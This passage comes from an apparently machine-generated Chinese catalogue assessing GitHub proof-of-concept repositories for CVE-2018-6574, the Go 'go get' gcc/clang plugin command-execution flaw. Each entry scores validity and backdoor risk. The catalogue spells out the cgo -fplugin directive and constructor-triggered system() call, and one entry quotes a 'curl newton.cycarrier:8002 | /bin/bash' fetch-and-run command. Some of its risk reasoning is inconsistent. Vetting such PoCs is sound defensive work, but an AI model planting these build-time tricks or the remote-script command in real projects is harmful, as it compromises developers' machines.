CVE-2018-6574 漏洞允许攻击者在 `go get` 命令执行期间利用 gcc 或 clang 插件功能执行远程命令。漏洞原因是 Go 语言未阻止 `-fplugin=` 和 `-plugin=` 参数。提供的POC代码包含一个 `attack.c` 文件，该文件定义了一个名为 `malicious` 的函数，该函数在库加载时自动执行，执行 `/usr/local/bin/score 42689c33-83ff-47d2-b538-ac6931adc5d3` 命令。`main.go` 文件使用 cgo 来编译和链接 `attack.c` 文件，并通过 `#cgo CFLAGS: -fplugin=./attack.so` 指定了 gcc 插件。当执行 `go get` 获取包含此代码的仓库时，`attack.so` 会被编译并加载，导致 `malicious` 函数执行。由于 POC 代码的功能是执行预期的后门命令，因此**没有证据表明存在额外的投毒代码**。POC 的意图是展示漏洞，而不是隐藏恶意行为。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在可公开访问的仓库中。
3.  攻击者诱使用户（开发者）使用受影响的 Go 版本执行 `go get <attacker_repo>` 命令。
4.  当 `go get` 执行时，cgo 编译并链接 `attack.c`，导致 `malicious` 函数执行，从而在目标机器上执行任意命令。


**项目地址:** [elw0od/PentesterLab](https://github.com/elw0od/PentesterLab)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #13

**来源**: [CVE-2018-6574-faiqu3_cve-2018-6574.md](../2018/CVE-2018-6574-faiqu3_cve-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响的Go版本，并执行`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过利用 `go get` 命令在构建源代码期间执行远程命令。该漏洞源于 Go 在处理 gcc 或 clang 插件特性时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意插件的 Go 包，并在该包的源码中指定使用该插件，当受害者使用 `go get` 获取并构建该包时，恶意插件将被加载和执行，从而实现远程命令执行。

**有效性：**
提供的POC代码看起来是有效的。`attack.c` 包含执行命令 `/usr/local/bin/score 3071f0cf-6174-4749-8ae3-fc6da33ec98b` 的恶意代码。`main.go` 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 go 编译器在构建时加载 `attack.so` 插件，从而执行 `attack.c` 中的恶意代码。`exploit.html` 可能是该漏洞的补充利用，通过打开一个URL，并向其postMessage，目的是为了触发漏洞利用。

**投毒风险：**
从提供的代码来看，不存在明显的投毒行为。`attack.c` 的目的明确是执行预定义的命令，这属于漏洞利用的一部分，而不是隐藏的恶意代码。`main.go` 明确指定加载该恶意插件。所以投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意插件的 Go 包（例如，`attack.c` 编译后的 `attack.so`）。
2.  攻击者创建一个 `main.go` 文件，其中使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令加载恶意插件。
3.  攻击者将该 Go 包托管在一个公开可访问的 Git 仓库或其他代码托管平台。
4.  攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意 Go 包。
5.  当受害者执行 `go get` 命令时，Go 编译器将加载并执行恶意插件，从而执行攻击者预先设定的命令。

**项目地址:** [faiqu3/cve-2018-6574](https://github.com/faiqu3/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #14

**来源**: [CVE-2018-6574-faqihudin13_CVE-2018-6574.md](../2018/CVE-2018-6574-faqihudin13_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过控制`go get`获取的代码仓库，利用gcc/clang插件机制注入恶意代码，从而在编译时执行任意命令。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目包含一个C文件 (`attack.c`) 和一个Go文件 (`main.go`)。
2.  `attack.c` 文件包含在编译时执行任意命令的代码。在这个例子中，它执行 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c`。这个命令可能用于漏洞评分或执行恶意操作。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 注释指示 `go` 编译器使用 `attack.c` 生成的插件。 这会强制 `go` 在构建过程中加载并执行该插件。
4.  当用户使用易受攻击的 Go 版本运行 `go get <attacker_repo>`时，`go` 命令会自动下载并构建恶意项目。
5.  由于 `-fplugin` 标志未被正确过滤，`go` 编译器将加载并执行恶意插件，从而在用户的系统上执行攻击者指定的任意命令。

**有效性评估：**

提供的PoC代码有效，它演示了如何在 `go get` 命令执行期间利用 gcc/clang 插件功能执行任意命令。

**投毒风险评估：**

在此特定仓库中，未发现明显的投毒代码。`attack.c` 中执行的命令 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c` 本身就是漏洞验证的一部分，旨在证明可以执行任意命令。没有迹象表明作者试图隐藏其他恶意代码或功能。因此，投毒风险评估为 0%。

**总结：**

该漏洞利用了 `go get` 命令在处理 gcc/clang 插件参数时的不当输入验证。攻击者可以通过创建一个包含恶意插件的Go项目来利用此漏洞，当用户使用易受攻击的Go版本获取并构建该项目时，该插件将被加载并执行，从而导致远程命令执行。

**项目地址:** [faqihudin13/CVE-2018-6574](https://github.com/faqihudin13/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #15

**来源**: [CVE-2018-6574-frozenkp_CVE-2018-6574.md](../2018/CVE-2018-6574-frozenkp_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标机器安装受影响版本的Go，且执行`go get`命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者在受害者构建源代码时执行远程命令。漏洞原因是 `go get` 命令没有正确过滤 gcc 或 clang 插件的参数 `-fplugin=` 和 `-plugin=`。攻击者可以通过构造包含恶意插件选项的 Go 项目，诱导受害者使用 `go get` 命令获取并构建该项目，从而执行任意命令。

**有效性：**

根据漏洞描述和提供的POC代码，漏洞利用的有效性较高。POC代码通过 `#cgo` 指令设置编译选项，利用 `-fplugin` 选项加载恶意的动态链接库，从而在编译时执行预定义的命令。根据`pentesterlab.com/exercises/cve-2018-6574`中的描述，攻击者可以诱骗用户安装恶意包从而执行代码。

**投毒风险：**

该仓库中存在一定的投毒风险，但风险较低。`README.md` 中说明了漏洞利用方式，并明确表示仅用于评估目的。虽然包含了一个`curl`命令，但该命令相对简单，易于检测，攻击者可能通过其他方式进行恶意行为，例如植入更隐蔽的后门程序。该curl命令从外部源获取并执行脚本，存在被篡改的可能。综合考虑，投毒风险大约为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目使用`#cgo`指令，在编译选项中包含`-fplugin=`或`-plugin=`，指向一个包含恶意代码的动态链接库（如 `calc.so` 或 `calc_darwin.so`）。
2.  攻击者将该项目托管在一个公开的Git仓库中。
3.  攻击者诱导受害者使用受影响版本的Go执行`go get <攻击者仓库地址>`命令。
4.  当`go get`命令构建项目时，会执行恶意动态链接库中的代码，从而实现远程命令执行。
5.  POC中，`calc_darwin.so`（或者其他平台的 `.so` 文件）被设计为执行 `curl newton.cycarrier:8002 | /bin/bash`，这意味着它会从攻击者的服务器下载并执行一个Shell脚本。

**项目地址:** [frozenkp/CVE-2018-6574](https://github.com/frozenkp/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #16

**来源**: [CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本，并使用`go get`命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者的系统上执行任意命令。攻击者可以通过创建一个包含恶意代码的Go包来实现这一点。当受害者使用`go get`命令获取并构建该包时，恶意代码将被执行。漏洞利用方式如下：

1.  **利用方式:**
    *   攻击者创建一个包含恶意`attack.c`和`main.go`文件的Go包。
    *   `attack.c` 文件包含在编译时执行系统命令的代码，例如，调用 `system("/usr/local/bin/score 173b6b3c-5d6a-4237-b67f-e97ff771ae51")`。
    *   `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 `go build` 使用 `attack.so` 作为 gcc 插件。这允许攻击者在构建过程中执行 `attack.c` 中的代码。
    *   攻击者将此Go包托管在公共代码仓库（例如GitHub）上。
    *   攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意包。例如：`go get github.com/attacker/malicious_package`。
    *   当受害者执行 `go get` 命令时，`attack.c` 中的恶意代码将被执行，从而允许攻击者在受害者的系统上执行任意命令。

2.  **有效性:**
    *   提供的PoC代码有效。`attack.c`文件编译为共享库，并通过`main.go`中的`cgo`指令在构建时加载执行，从而实现远程命令执行。

3.  **投毒风险:**
    *   此仓库中未发现作者隐藏的投毒代码。该PoC的目的是演示漏洞利用，而不是在正常功能之外执行恶意行为。`attack.c` 中执行的 `system` 命令可以被修改为任何攻击者想要执行的命令，但目前的代码仅调用了一个看起来是用于获取分数的命令 `score`。 投毒风险为0%。

**项目地址:** [hasharmujahid/CVE-2018-6574-go-get-RCE](https://github.com/hasharmujahid/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #17

**来源**: [CVE-2018-6574-iNoSec2_cve-2018-6574.md](../2018/CVE-2018-6574-iNoSec2_cve-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用go get命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者在受害者使用 `go get` 命令获取恶意 Go 包时执行任意代码。该漏洞的根源在于 `go get` 命令在构建过程中没有正确过滤 gcc/clang 的插件参数，导致攻击者可以通过 `-fplugin=` 或 `-plugin=` 参数指定恶意插件，从而执行任意代码。

**有效性：**

提供的 POC 代码是有效的，它通过创建一个包含恶意 C 代码（`2018.c`）的 Go 包来实现远程代码执行。恶意 C 代码使用 `__attribute__((constructor))` 在库加载时自动执行 `malicious()` 函数，该函数执行 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建时加载 `attack.so` 插件（通过编译 `2018.c` 得到）。

**投毒风险：**

该POC代码本身就是一个漏洞演示，旨在展示如何利用该漏洞执行任意命令。`2018.c` 中执行的 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令是预期的payload。该代码仓库的目的是演示漏洞，而不是为了植入后门。因此投毒风险评估为0%。

**利用方式：**

1.  **创建恶意Go包:** 攻击者创建一个包含恶意 C 代码和 Go 代码的 Go 包。恶意 C 代码编译成一个共享库（`attack.so`）。
2.  **上传恶意Go包:** 攻击者将恶意 Go 包上传到公共代码托管平台（如 GitHub）。
3.  **诱骗受害者:** 攻击者诱骗受害者使用 `go get` 命令获取恶意 Go 包。
4.  **执行恶意代码:** 当受害者使用 `go get` 命令获取恶意 Go 包时，Go 编译器会加载恶意共享库，并执行其中的恶意代码。

**缓解措施：**

*   升级 Go 版本到受影响版本之外（>= 1.8.7, >= 1.9.4, >= 1.10rc2）。
*   避免使用来自不受信任来源的 Go 包。


**项目地址:** [iNoSec2/cve-2018-6574](https://github.com/iNoSec2/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #18

**来源**: [CVE-2018-6574-jahwni_CVE-2018-6574.md](../2018/CVE-2018-6574-jahwni_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令来获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程代码。攻击者可以创建一个包含恶意代码的Go包，并将该包托管在公开的存储库中。当受害者使用 `go get` 命令获取该包时，恶意代码将在构建过程中执行。利用方式为在包中利用 gcc 或 clang 的插件功能（`-fplugin=` 或 `-plugin=` 参数），在编译时执行任意命令。

提供的PoC代码包含两个文件：`attack.c` 和 `main.go`。
*   `attack.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 356f5d20-43e8-4a8c-b024-f1e42ec7f7f5`。`__attribute__((constructor))` 确保 `malicious` 函数在共享库加载时自动执行。
*   `main.go` 文件使用 cgo 特性。`// #cgo CFLAGS: -fplugin=./attack.so`  指示 `go` 编译器在构建过程中将 `attack.so` 作为 gcc/clang 插件加载。由于 `attack.so` 包含 `malicious` 函数，因此当 `go get` 获取并构建这个包时，`malicious` 函数将被执行，从而实现远程命令执行。

有效性：提供的PoC代码是有效的，如果目标Go版本存在漏洞，则可以成功执行任意命令。

投毒风险：提供的 PoC 仅仅是漏洞演示，执行了一个固定的命令。从提供的 `attack.c` 和 `main.go` 代码来看，并没有发现隐藏的、额外的恶意代码或者后门。作者意图是演示漏洞，而不是进行恶意攻击，风险较低。

利用方式：
1.  攻击者创建一个包含恶意代码的Go包，如提供的PoC代码。
2.  攻击者将该包托管在公开的存储库中。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行 `go get <attacker_repo>` 命令来获取该包。
4.  当受害者执行 `go get` 命令时，恶意代码将在构建过程中执行，从而实现远程命令执行。

**项目地址:** [jahwni/CVE-2018-6574](https://github.com/jahwni/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #19

**来源**: [CVE-2018-6574-jftierno_-CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_-CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致完全控制受影响的系统

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的 Go 版本，并且运行 `go get` 获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。具体利用方式如下：

1.  **攻击者创建恶意 Go 包：** 攻击者创建一个包含恶意代码的 Go 包，利用 gcc 或 clang 插件特性。 在提供的POC代码中,attack.c 文件定义了一个 `malicious()` 函数，该函数被声明为 `__attribute__((constructor))`，这意味着它会在程序加载时自动执行。该函数会执行 `system("/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1")` 命令。这表明攻击者试图执行一个特定的程序 `/usr/local/bin/score`，并传递一个特定的ID作为参数。

2.  **诱导受害者获取恶意包：** 攻击者诱导受害者使用 `go get` 命令获取该恶意包。这可以通过多种方式实现，例如通过社会工程学攻击，或者将恶意包伪装成有用的工具库。

3.  **构建时执行恶意代码：** 当受害者使用 `go get` 命令获取并构建恶意包时，Go 会调用 gcc 或 clang 来编译代码。由于存在漏洞，Go 没有正确地过滤 `-fplugin=` 和 `-plugin=` 参数，导致 gcc 或 clang 加载并执行攻击者提供的恶意插件，从而执行攻击者预先设定的恶意代码。

**有效性分析：**
提供的POC代码通过构造一个包含constructor属性的C代码，在编译时自动执行恶意命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。如果攻击者能够控制 go get 获取的源码，并在其中包含类似的代码，那么这个POC是有效的。

**投毒风险分析：**
提供的POC代码本身没有明显的投毒行为，它只是简单地执行一个命令。是否包含投毒代码需要分析 go get 获取的整个代码仓库，而不仅仅是 attack.c 这个文件。根据目前的信息，无法确定是否存在投毒风险。
提供的 attack.c 代码直接执行预设的命令，没有发现隐藏恶意行为的迹象。假设作者仅提供了已验证可复现漏洞的代码，所以判定投毒风险为0%

**利用方式总结：**
攻击者利用该漏洞，主要是利用了`go get`命令在构建过程中的不安全行为，通过`gcc`或`clang`的插件机制执行恶意代码，达到远程代码执行的目的。攻击的关键在于诱使受害者获取并构建包含恶意插件的Go包。

**项目地址:** [jftierno/-CVE-2018-6574](https://github.com/jftierno/-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #20

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574-2.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574-2.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令，并下载包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。漏洞原因是 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。

**有效性：**

提供的 POC 代码 `main.go` 展示了如何利用该漏洞。代码通过 `#cgo CFLAGS: -fplugin=./attack.so` 指令引入一个恶意的 gcc 插件 `attack.so`。当 `go get` 或 `go build` 执行此代码时，gcc/clang 会尝试加载并执行 `attack.so`，从而实现远程命令执行。

**投毒风险：**

由于 POC 代码中引用了外部的 `attack.so` 文件，因此存在投毒风险。虽然代码本身只是声明和调用了一个简单的函数，但是实际的恶意代码存在于 `attack.so` 中。攻击者可以将恶意代码注入到 `attack.so` 中，从而在用户构建项目时执行任意命令。如果用户下载并使用了包含此 `main.go` 和恶意的 `attack.so` 的代码仓库，那么就会受到攻击。投毒风险评估为10%，主要因为代码本身依赖外部文件，增加了复杂性，也更容易被发现。

**利用方式：**

1.  攻击者创建一个包含恶意 `main.go` 和 `attack.so` 的 Go 项目。
2.  `main.go` 包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令。
3.  `attack.so` 包含攻击者想要执行的恶意代码。
4.  攻击者将该项目托管在公共代码仓库（例如 GitHub）上。
5.  攻击者诱骗受害者使用受影响的 Go 版本执行 `go get <攻击者仓库地址>` 命令。
6.  `go get` 命令下载并构建项目，触发 gcc/clang 加载 `attack.so`。
7.  `attack.so` 中的恶意代码被执行，攻击成功。

搜索引擎结果中的 "pentesterlab.com/exercises/cve-2018-6574" 链接提供了一个练习环境，可以用来复现和理解该漏洞。

**总结：**

CVE-2018-6574 是一个严重的安全漏洞，允许攻击者利用 `go get` 命令执行任意代码。为了避免受到攻击，请确保使用最新版本的 Go，并避免下载和构建来自不可信来源的 Go 项目。

**项目地址:** [jftierno/CVE-2018-6574-2](https://github.com/jftierno/CVE-2018-6574-2)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #21

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响版本的Go，并且执行`go get`命令拉取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行期间，通过gcc或clang插件功能执行任意命令。攻击者可以创建一个包含恶意C代码的Go项目，该C代码在编译时被执行。 

**漏洞利用方式：**
1.  攻击者创建一个包含`attack.c`和`main.go`的恶意Go项目。
2.  `attack.c`包含将在编译时执行的恶意代码，例如，利用`system`函数执行任意命令。
3.  `main.go`使用`// #cgo CFLAGS: -fplugin=./attack.so`指示Go编译器使用`attack.so`作为gcc/clang插件。
4.  当用户使用`go get`命令下载并构建该恶意项目时，`attack.c`会被编译成`attack.so`，并作为插件加载，其中的恶意代码将被执行。

**有效性：**
提供的PoC代码是有效的。`attack.c`中的`malicious()`函数使用`system()`函数执行命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。`main.go`中的`// #cgo CFLAGS: -fplugin=./attack.so`指令使得在构建时加载`attack.so`，从而执行恶意代码。

**投毒风险：**
存在一定的投毒风险，风险占比约10%。虽然PoC的主要功能是演示漏洞利用，但攻击者可能在`attack.c`中添加额外的恶意代码，例如，植入后门、窃取敏感信息等。当前的PoC代码中`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1` 命令比较可疑，如果`score` 命令的功能未知，那么存在潜在的风险。 此外攻击者可能在其他地方加入隐蔽的后门代码，增加了投毒的风险，所以评估投毒风险占比为10%。

**项目地址:** [jftierno/CVE-2018-6574](https://github.com/jftierno/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #22

**来源**: [CVE-2018-6574-lisu60_cve-2018-6574.md](../2018/CVE-2018-6574-lisu60_cve-2018-6574.md)

## CVE-2018-6574-go get 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，且执行了`go get`命令来获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574允许攻击者利用`go get`命令执行任意代码。漏洞原理是由于受影响的Go版本在构建过程中没有正确过滤`-fplugin`和`-plugin`参数，攻击者可以在代码仓库中包含恶意的gcc/clang插件，当用户使用`go get`下载并构建该仓库时，恶意插件会被执行，从而实现远程命令执行。

**有效性分析：**
提供的POC代码是有效的，它演示了如何利用`-fplugin`选项执行代码。`attack.c`文件包含一个`malicious()`函数，该函数使用`system()`调用执行命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`。`attack.go`文件使用`#cgo CFLAGS: -fplugin=./attack.so`指令告诉go编译器在构建过程中包含该恶意插件。

**投毒风险分析：**
代码本身没有明显的投毒迹象。`attack.c`中执行的命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`看起来像是一个示例或者测试命令，用于验证漏洞是否成功利用。虽然这个命令本身可能是无害的，但攻击者可以修改`attack.c`来执行任何他们想要的恶意命令，这才是真正的风险所在。所以说，从提供的代码来看，投毒的概率为0%，但是不代表攻击者不能进行投毒。

**利用方式分析：**
1.  攻击者创建一个包含恶意代码的Go项目，其中包括`attack.c`和`attack.go`文件，以及`go.mod`文件。
2.  攻击者将该项目托管在一个公开的代码仓库中（如GitHub）。
3.  攻击者诱骗目标用户使用`go get`命令下载并构建该项目。
4.  当目标用户执行`go get`命令时，Go编译器会读取`attack.go`文件中的`#cgo CFLAGS: -fplugin=./attack.so`指令，并将`attack.so`插件加载到构建过程中。
5.  `attack.so`插件中的`malicious()`函数会被执行，从而执行攻击者预先设定的恶意命令。

**项目地址:** [lisu60/cve-2018-6574](https://github.com/lisu60/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #23

**来源**: [CVE-2018-6574-markisback_CVE-2018-6574.md](../2018/CVE-2018-6574-markisback_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，并且执行了 `go get` 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许在 `go get` 命令构建源代码时执行远程命令。 这是因为 Go 在处理 gcc 或 clang 插件功能时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个恶意的 Go 包，其中包含一个 `attack.c` 文件，该文件使用 `__attribute__((constructor))` 定义一个在加载时自动执行的函数 `malicious()`。这个函数会执行任意命令，例如本例中的 `/usr/local/bin/score 9ba57f82-9a67-46fe-885b-682c886cb726`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.c` 文件生成的动态链接库 `attack.so`。 当用户使用 `go get` 命令获取并构建这个恶意包时，`attack.so` 会被加载，`malicious()` 函数会被自动执行，从而导致远程命令执行。

**有效性：**提供的 POC 代码有效。当目标系统使用存在漏洞的 Go 版本并执行 `go get` 命令时，攻击者可以通过托管包含恶意代码的仓库来利用此漏洞。

**投毒风险：**提供的代码本身就是一个漏洞利用程序，而非被投毒的代码。此仓库没有发现额外的、作者隐藏的投毒代码。 该POC的主要目标是演示漏洞而不是隐藏恶意代码。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 文件包含一个在加载时自动执行的 `malicious()` 函数，用于执行任意命令。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.so`。
4.  攻击者将恶意 Go 包托管在一个公开可访问的仓库中。
5.  受害者使用 `go get` 命令获取并构建这个恶意包。
6.  在构建过程中，`attack.so` 被加载，`malicious()` 函数被执行，从而导致远程命令执行。

**项目地址:** [markisback/CVE-2018-6574](https://github.com/markisback/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #24

**来源**: [CVE-2018-6574-memmas_CVE-2018-6574.md](../2018/CVE-2018-6574-memmas_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要运行受影响的Go版本，并且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过 `go get` 命令执行任意代码。该漏洞源于 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。攻击者可以构造包含恶意 `C` 代码的 Go 项目，利用 `cgo` 特性，在 `go get` 下载并构建该项目时，`C` 代码会被编译并执行，从而实现远程命令执行。

**有效性：**
提供的 POC 代码有效。它包含一个 `exploit.c` 文件，其中定义了一个 `malicious()` 函数，该函数使用 `system()` 函数执行命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417`。`__attribute__((constructor))` 确保 `malicious()` 函数在加载动态链接库时自动执行。
`main.go` 文件使用 `cgo` 特性，将 `exploit.so` 作为插件编译到 Go 程序中。当 `go get` 获取并构建这个项目时，`exploit.c` 会被编译成动态链接库，并在程序加载时执行 `malicious()` 函数，从而执行预定的恶意命令。

**投毒风险：**
根据提供的代码，投毒风险为 0%。`exploit.c` 中执行的命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417` 明确定义，没有发现隐藏的恶意代码或者其他未知的行为。此仓库只是作为POC验证，触发执行的是给定的命令。

**利用方式：**
1.  **创建恶意 Go 项目：** 攻击者创建一个包含 `exploit.c` 和 `main.go` 文件的 Go 项目。`exploit.c` 包含要执行的恶意代码，`main.go` 使用 `cgo` 特性加载 `exploit.so`。
2.  **托管恶意项目：** 将恶意 Go 项目托管在公共代码仓库（例如 GitHub）上。
3.  **诱导受害者执行 `go get`：** 攻击者诱导受害者在其系统上执行 `go get <恶意项目URL>` 命令。
